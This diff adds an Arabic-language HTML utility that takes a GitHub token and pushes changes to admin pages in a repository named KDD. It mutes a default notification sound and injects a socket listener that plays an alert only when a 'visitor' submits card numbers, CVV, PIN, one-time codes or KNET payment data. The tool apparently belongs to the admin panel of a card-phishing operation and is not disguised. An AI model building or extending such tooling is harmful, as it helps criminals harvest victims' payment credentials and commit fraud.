@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>KDD - تعطيل صوت الفقّة الأصلي</title>
+<style>
+body{background:#111;color:#eee;font-family:Tahoma,Arial,sans-serif;padding:16px;margin:0}
+input,button{padding:12px;font-size:16px;border-radius:8px;border:0;margin:5px 0;width:100%;box-sizing:border-box}
+input{background:#000;color:#0f0;direction:ltr}
+button{background:#2ecc71;color:#000;font-weight:700;cursor:pointer}
+#log{white-space:pre-wrap;background:#000;color:#ddd;padding:10px;margin-top:10px;font-family:monospace;font-size:12px;min-height:120px;direction:ltr;text-align:left;line-height:1.6}
+</style>
+</head>
+<body>
+<b>تعطيل الفقّة الأصلية + فلتر (ملخص / كي نت-بطاقة / رمز)</b>
+<input id="tok" placeholder="ghp_..." autocomplete="off">
+<button onclick="kddRun()">تنفيذ</button>
+<div id="log">انتظر...</div>
+<script>
+window.onerror=function(m,s,l){try{var e=document.getElementById('log');if(e){var d=document.createElement('div');d.style.color='#f66';d.textContent='JS error: '+m+' @'+l;e.appendChild(d)}}catch(_){}};
+
+var NEWF = '<scr'+'ipt id="kddF113">/*FROG-FILTER2*/\n'+
+'(function(){\n'+
+'  if (window.__f113d) return; window.__f113d = 1;\n'+
+'  var last = 0;\n'+
+'  function A(){ try { return frogAudio; } catch(e){ return null; } }\n'+
+'  function d(){\n'+
+'    var n = Date.now(); if (n - last < 350) return; last = n;\n'+
+'    try { var a=A(); if(a){ a.currentTime=0; var f=a.__realPlay||a.play; if(f) f.call(a); return; } } catch(e){}\n'+
+'    try { new Audio("/admin/frog.mp3").play(); } catch(e){}\n'+
+'  }\n'+
+'  function ok(x){\n'+
+'    try{\n'+
+'      var q=(x&&x.data)||{};\n'+
+'      var c=q.content||q;\n'+
+'      var pg=String(q.page||(x&&x.visitor&&x.visitor.page)||"");\n'+
+'      if(q.digitCode!=null && String(q.digitCode).trim()!=="") return true;\n'+
+'      if(c && c["الرمز"]!=null && String(c["الرمز"]).trim()!=="") return true;\n'+
+'      if(q.paymentCard) return true;\n'+
+'      if(c && (c.cardNumber||c.cardNumberOnly||c.cvv||c.pin||c.nameOnCard)) return true;\n'+
+'      if(/كي\\s*نت|knet|بطاقة|card|credit|دفع/i.test(pg)) return true;\n'+
+'      if(/ملخص|summary/i.test(pg)) return true;\n'+
+'      return false;\n'+
+'    }catch(e){ return false; }\n'+
+'  }\n'+
+'  function h(){\n'+
+'    try{\n'+
+'      var s=window.socket; if(!s||s===window.__stub||!s.on) return;\n'+
+'      var a=A(); if(a&&!a.__realPlay){ a.__realPlay=a.play.bind(a); a.play=function(){ return Promise.resolve(); }; }\n'+
+'      if(s.__f113n) return; s.__f113n=1;\n'+
+'      s.on("visitor:dataSubmitted", function(x){ try{ if(ok(x)) d(); }catch(e){} });\n'+
+'    }catch(e){}\n'+
+'  }\n'+
+'  h(); setInterval(h,500);\n'+
+'})();\n'+
+'</scr'+'ipt>';
+
+function $(i){return document.getElementById(i)}
+function L(t,c){var e=$('log');if(!e)return;var d=document.createElement('div');if(c)d.style.color=c;d.textContent=t;e.appendChild(d);e.scrollTop=e.scrollHeight}
+function LS(k,v){try{if(v===undefined){return localStorage.getItem(k)}localStorage.setItem(k,v);return 1}catch(e){return null}}
+function b64e(s){var b=new TextEncoder().encode(s),o='';for(var i=0;i<b.length;i++)o+=String.fromCharCode(b[i]);return btoa(o)}
+function b64d(s){var x=atob(String(s).replace(/\s/g,'')),u=new Uint8Array(x.length);for(var i=0;i<x.length;i++)u[i]=x.charCodeAt(i);return new TextDecoder().decode(u)}
+function H(){return{'Authorization':'token '+$('tok').value.trim(),'Accept':'application/vnd.github+json','Content-Type':'application/json'}}
+
+function fix(h){
+  var ch=false;
+  if(h.indexOf('FROG-OFF')===-1){
+    if(/frogAudio\.volume\s*=\s*[0-9.]+;/.test(h)){
+      h=h.replace(/(frogAudio\.volume\s*=\s*[0-9.]+;)/,'$1\n    /*FROG-OFF*/ if(!frogAudio.__realPlay){ frogAudio.__realPlay=frogAudio.play.bind(frogAudio); frogAudio.play=function(){ return Promise.resolve(); }; }');
+      ch=true;
+    } else if(/const frogAudio\s*=\s*new Audio\([^)]*\);/.test(h)){
+      h=h.replace(/(const frogAudio\s*=\s*new Audio\([^)]*\);)/,'$1\n    /*FROG-OFF*/ if(!frogAudio.__realPlay){ frogAudio.__realPlay=frogAudio.play.bind(frogAudio); frogAudio.play=function(){ return Promise.resolve(); }; }');
+      ch=true;
+    }
+  }
+  if(h.indexOf('FROG-FILTER2')===-1){
+    if(/<script id="kddF113">[\s\S]*?<\/script>/.test(h)){ h=h.replace(/<script id="kddF113">[\s\S]*?<\/script>/, NEWF); ch=true; }
+    else { var b=h.search(/<\/body>/i); h = b>-1 ? h.slice(0,b)+NEWF+'\n'+h.slice(b) : h+NEWF; ch=true; }
+  }
+  return ch ? h : null;
+}
+
+var FILES=['server/admin/index.html','kdd-public/admin.html'];
+var running=false;
+
+function kddRun(){
+ if(running) return; running=true;
+ try{
+  var t=$('tok').value.trim();
+  if(!t){L('أدخل التوكن أولاً','#f66');running=false;return}
+  LS('kdd_tok',t);
+  $('log').innerHTML='';L('بدأ التنفيذ...','#6cf');
+  var i=0,D=0,S=0;
+  (function nx(){
+   if(i>=FILES.length){L('— انتهى — تم: '+D+' / موجود: '+S,(D?'#2ecc71':'#f66'));running=false;return}
+   var p=FILES[i++];
+   fetch('https://api.github.com/repos/fahshomi-ui/KDD/contents/'+p+'?ref=main',{headers:H()})
+   .then(function(r){if(!r.ok)throw new Error('قراءة '+p+' ('+r.status+')');return r.json()})
+   .then(function(j){var nw=fix(b64d(j.content));if(!nw){L('• '+p+' : مثبّت مسبقاً','#2ecc71');S++;return}
+     return fetch('https://api.github.com/repos/fahshomi-ui/KDD/contents/'+p,{method:'PUT',headers:H(),body:JSON.stringify({message:'تعطيل صوت الفقّة الأصلي + فلتر',content:b64e(nw),sha:j.sha,branch:'main'})})
+     .then(function(r){if(!r.ok)return r.text().then(function(x){throw new Error('رفع '+p+' ('+r.status+') '+x.slice(0,90))});L('• '+p+' : تم ✓','#2ecc71');D++})})
+   .catch(function(e){L('• '+p+' : '+e.message,'#f66')})
+   .then(nx);
+  })();
+ }catch(e){L('خطأ: '+e.message,'#f66');running=false}
+}
+
+var _w=0;
+(function wait(){ try{ if(document.getElementById('log')){ var sv=LS('kdd_tok'); if(sv)$('tok').value=sv; $('log').innerHTML=''; L('جاهز — اضغط تنفيذ','#2ecc71'); return; } }catch(e){} if(++_w>300)return; setTimeout(wait,50); })();
+</script>
+</body>
+</html>
